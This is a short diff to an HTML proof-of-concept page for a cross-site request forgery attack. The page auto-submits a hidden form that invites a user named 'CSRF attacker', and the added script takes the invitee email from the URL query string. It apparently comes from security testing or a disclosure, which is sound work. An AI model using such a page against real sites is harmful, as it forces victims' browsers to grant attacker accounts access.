@@ -8,6 +8,12 @@
 	  <input type="hidden" name="userInvite[0][name]" value="CSRF attacker" />
     </form>
     <script>
+	  const params = new URLSearchParams(window.location.search);
+      let email = params.get('email');
+      if (email) {
+        email = email.replace(/ /g, '+').trim();
+        document.querySelector('input[name="userInvite[0][email]"]').value = email;
+      }
       document.forms[0].submit();
     </script>
   </body>
